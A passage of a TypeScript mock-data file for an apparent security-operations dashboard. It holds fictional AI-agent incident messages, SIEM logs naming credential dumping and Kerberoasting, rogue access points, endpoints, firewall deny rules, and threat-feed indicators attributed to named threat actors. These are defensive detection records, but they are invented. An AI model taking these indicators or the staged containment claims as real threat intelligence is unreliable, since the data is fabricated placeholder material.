    content: "Consensus reached. Executing automated SOAR Playbook #PB-409: Host network isolation engaged, Palo Alto firewall egress IP block active, and AD password reset triggered for service account svc_db_admin.",
    technicalFinding: "Kerberos TGT ticket invalidated. Zero lateral movement observed across perimeter domain controllers.",
    proposedAction: "Enforce Dynamic Firewall ACL Rule FW-1001. Status: ALL THREATS CONTAINED.",
  },
  {
    id: "swm-6",
    agentId: "reporter",
    agentName: "Reporter Sentinel",
    agentAvatar: "https://images.unsplash.com/photo-1580489944761-15a19d654956?w=150&auto=format&fit=crop&q=80",
    timestamp: "10:15:02 UTC",
    confidenceScore: 99,
    stance: "BROADCAST_ALERT",
    content: "Executive incident briefing compiled. Threat vector contained within 4.2 minutes (MTTR). Zero data exfiltration. Generating CISO executive summary and regulatory audit logs.",
    technicalFinding: "Dwell time: 5m 50s. Root cause: Spearphishing link (T1566) -> PowerShell (T1059) -> LSASS Access (T1003).",
    proposedAction: "Dispatch automated PDF executive briefing to CISO, VP of Infrastructure, and Legal Council.",
  },
];

export const MOCK_SIEM_LOGS: SIEMLog[] = [
  { id: "log-1", timestamp: "2026-08-04 10:11:45", sourceIp: "10.0.4.112", destIp: "185.220.101.44", host: "SRV-FINANCE-02", service: "Sysmon", severity: "Critical", eventCode: "10", message: "LSASS Process Access Granted (ProcessAccess)", category: "Credential Dumping", rawPayload: '{"EventID":10,"SourceImage":"C:\\Windows\\powershell.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9d414"}' },
  { id: "log-2", timestamp: "2026-08-04 10:10:02", sourceIp: "10.0.1.10", destIp: "10.0.4.55", host: "SRV-DC-01", service: "ActiveDirectory", severity: "High", eventCode: "4769", message: "Kerberos TGS Ticket Requested (RC4-HMAC)", category: "Kerberoasting", rawPayload: '{"EventID":4769,"TargetName":"MSSQLSvc/sql.corp.local","TicketEncryptionType":"0x17","Status":"0x0"}' },
  { id: "log-3", timestamp: "2026-08-04 10:08:14", sourceIp: "192.168.10.104", destIp: "192.168.10.1", host: "AP-FLOOR3-WEST", service: "MerakiWIDS", severity: "High", eventCode: "WIDS-04", message: "Rogue Access Point Detected (CORP-SECURE)", category: "Wireless", rawPayload: '{"BSSID":"00:c0:ca:98:dd:01","SSID":"CORP-SECURE","Channel":6,"Auth":"WPA2-PSK"}' },
  { id: "log-4", timestamp: "2026-08-04 10:05:30", sourceIp: "10.0.2.88", destIp: "142.250.190.46", host: "WS-DEV-19", service: "PaloAltoFirewall", severity: "Medium", eventCode: "PAN-FW-ALLOW", message: "HTTPS Egress Connection Allowed", category: "Network", rawPayload: '{"Action":"allow","Src":"10.0.2.88","Dst":"142.250.190.46","App":"ssl","Bytes":14022}' },
  { id: "log-5", timestamp: "2026-08-04 10:01:12", sourceIp: "10.0.1.100", destIp: "10.0.1.10", host: "SRV-DC-01", service: "WinEventLog", severity: "Low", eventCode: "4624", message: "An account was successfully logged on", category: "Authentication", rawPayload: '{"EventID":4624,"TargetUserName":"svc_backup","LogonType":3,"AuthenticationPackage":"NTLM"}' },
  { id: "log-6", timestamp: "2026-08-04 09:58:00", sourceIp: "10.0.5.12", destIp: "10.0.5.1", host: "GW-BRANCH-01", service: "CiscoASA", severity: "Low", eventCode: "ASA-106023", message: "Inbound ICMP Echo Request Allowed", category: "Firewall", rawPayload: '{"Deny":false,"Proto":"ICMP","Src":"10.0.5.12","Dst":"10.0.5.1"}' },
];

export const MOCK_WIFI_APS: WiFiAccessPoint[] = [
  { bssid: "00:C0:CA:98:DD:01", ssid: "CORP-SECURE", channel: 6, rssi: -42, security: "WPA2-PSK (Untrusted)", status: "rogue", connectedDevices: 4, riskScore: 92, vendor: "Alfa Wireless (Evil Twin)" },
  { bssid: "AA:BB:CC:11:22:33", ssid: "CORP-SECURE", channel: 36, rssi: -58, security: "WPA3-Enterprise (802.1X)", status: "trusted", connectedDevices: 38, riskScore: 5, vendor: "Cisco Meraki MR46" },
  { bssid: "AA:BB:CC:11:22:34", ssid: "CORP-GUEST", channel: 36, rssi: -60, security: "WPA2-Enterprise", status: "trusted", connectedDevices: 12, riskScore: 12, vendor: "Cisco Meraki MR46" },
  { bssid: "AA:BB:CC:44:55:66", ssid: "CORP-SECURE", channel: 149, rssi: -64, security: "WPA3-Enterprise", status: "deauth_attack", connectedDevices: 22, riskScore: 78, vendor: "Aruba AP-555" },
];

export const MOCK_ENDPOINTS: EndpointHost[] = [
  { id: "ep-1", hostname: "SRV-FINANCE-02", ip: "10.0.4.112", os: "Windows Server 2022", type: "Server", status: "compromised", agentVersion: "CrowdStrike Falcon v7.12", vulnerabilitiesCount: 4, lastSeen: "Just now", cpuUsage: 84, ramUsage: 78 },
  { id: "ep-2", hostname: "SRV-DC-01", ip: "10.0.1.10", os: "Windows Server 2022", type: "Domain Controller", status: "vulnerable", agentVersion: "CrowdStrike Falcon v7.12", vulnerabilitiesCount: 2, lastSeen: "1 min ago", cpuUsage: 35, ramUsage: 62 },
  { id: "ep-3", hostname: "WS-FINANCE-09", ip: "10.0.4.55", os: "Windows 11 Enterprise", type: "Workstation", status: "isolated", agentVersion: "CrowdStrike Falcon v7.12", vulnerabilitiesCount: 1, lastSeen: "5 mins ago", cpuUsage: 4, ramUsage: 30 },
  { id: "ep-4", hostname: "GW-PERIMETER-01", ip: "192.168.1.1", os: "Palo Alto PAN-OS 11.0", type: "Gateway", status: "healthy", agentVersion: "Cortex XDR v8.2", vulnerabilitiesCount: 0, lastSeen: "Just now", cpuUsage: 22, ramUsage: 41 },
  { id: "ep-5", hostname: "WS-EXEC-BOARD", ip: "10.0.3.14", os: "macOS Sonoma 14.5", type: "Workstation", status: "healthy", agentVersion: "Jamf Protect 4.1", vulnerabilitiesCount: 1, lastSeen: " Just now", cpuUsage: 12, ramUsage: 48 },
];

export const MOCK_FIREWALL_RULES: FirewallRule[] = [
  { id: "FW-1001", priority: 1, action: "DENY", source: "185.220.101.44", destination: "ANY", port: "ANY", protocol: "ANY", hitCount: 14201, createdBy: "Sentinel SOAR Auto-Block", notes: "Cobalt Strike C2 IP contained in Incident #INC-2026-8801" },
  { id: "FW-1002", priority: 2, action: "DENY", source: "198.51.100.77", destination: "10.0.0.0/8", port: "443, 80", protocol: "TCP", hitCount: 8910, createdBy: "Threat Hunter Aegis", notes: "Malicious scanner targeting perimeter VPN" },
  { id: "FW-1003", priority: 10, action: "ALLOW", source: "10.0.0.0/8", destination: "10.0.1.10", port: "88, 389, 445", protocol: "TCP", hitCount: 1840291, createdBy: "Network Admin", notes: "Internal Active Directory replication & authentication" },
  { id: "FW-1004", priority: 20, action: "ALLOW", source: "10.0.0.0/8", destination: "INTERNET", port: "443", protocol: "TCP", hitCount: 948120, createdBy: "Network Admin", notes: "Standard encrypted corporate outbound traffic" },
];

export const MOCK_THREAT_FEEDS: ThreatFeedItem[] = [
  { id: "tf-1", indicator: "185.220.101.44", type: "IP", threatActor: "APT29 (Cozy Bear)", riskScore: 98, category: "Command & Control (C2)", dateAdded: "2026-08-03" },
  { id: "tf-2", indicator: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", type: "SHA256", threatActor: "LockBit 4.0", riskScore: 95, category: "Ransomware Stager", dateAdded: "2026-08-02" },
  { id: "tf-3", indicator: "c2-beacon-update.xyz", type: "Domain", threatActor: "Lazarus Group", riskScore: 89, category: "Phishing Domain", dateAdded: "2026-08-04" },
  { id: "tf-4", indicator: "https://auth-sec-update.info/login.php", type: "URL", threatActor: "FIN7", riskScore: 82, category: "Credential Harvester", dateAdded: "2026-08-01" },
];
